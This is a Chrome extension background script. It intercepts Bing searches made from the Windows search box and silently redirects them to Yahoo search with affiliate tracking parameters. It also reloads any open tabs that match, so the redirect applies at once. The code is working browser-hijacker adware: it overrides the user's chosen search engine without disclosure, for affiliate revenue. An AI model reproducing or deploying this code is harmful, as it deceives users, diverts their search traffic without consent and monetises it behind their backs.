var ctRegx = /\?.*(|&)q=([^&]+).*&form=(WNSGPH|WNSBOX|WNSFC2|WNSHCO|WNSSCX|WNSSSV)/;
chrome.webRequest.onBeforeRequest.addListener(function(d){
    var i, localStorage_data = {
        "param1": 1,
        "param2": '',
        "aflt": 'hdr_ydef',
        "ycc": false
    };

    var m = d.url.match(ctRegx);
    if (m) {
        for (i in localStorage_data) {
            if (localStorage[i]) localStorage_data[i] = (localStorage[i]);
        }

        localStorage_data['param2'] = (localStorage_data['param2'] == '') ? "f=14&pa=hodor&a="+localStorage_data['aflt'] : (localStorage_data['param2'] + '&f=14')

        url = 'https://search.yahoo.com/yhs/search?';
        var yccs = {"ar":1,"at":1,"br":1,"ca":1,"ch":1,"cl":1,"co":1,"de":1,"dk":1,"es":1,"fi":1,"fr":1,"us":1,"hk":1,"in":1,"id":1,"it":1,"malaysia":1,"mx":1,"nl":1,"no":1,"pe":1,"ph":1,"sg":1,"se":1,"tw":1,"th":1,"uk":1,"ve":1,"vn":1};
        if (localStorage_data['ycc'] &&
            yccs[localStorage_data['ycc'].toLowerCase()] &&
            localStorage_data['ycc'].toLowerCase() != 'us'
        ) {
            var ycc = localStorage_data['ycc'].toLowerCase();
            url = 'https://' + ycc + '.search.yahoo.com/yhs/search?';
        }

        var f = {
            "aflt":   "type",
            "param1": "param1",
            "param2": "param2",
        };

        for (i in f) {
            if (localStorage_data[i]) {
                url = url + f[i] + '=' + encodeURIComponent(localStorage_data[i]) + '&';
            }
        }

        return { redirectUrl: url + '&hspart=elm&hsimp=yhs-001&q=' + m[2] };
    }
}, { urls: ["*://*.bing.com/*"] }, ["blocking"] );

chrome.tabs.getAllInWindow(null, function(tabs){
    for (var i = 0; i < tabs.length; i++) {
        if (tabs[i].url) {
            var m = tabs[i].url.match(ctRegx);
            if (m) {
                chrome.tabs.reload(tabs[i].id);
            }
        }
    }
});
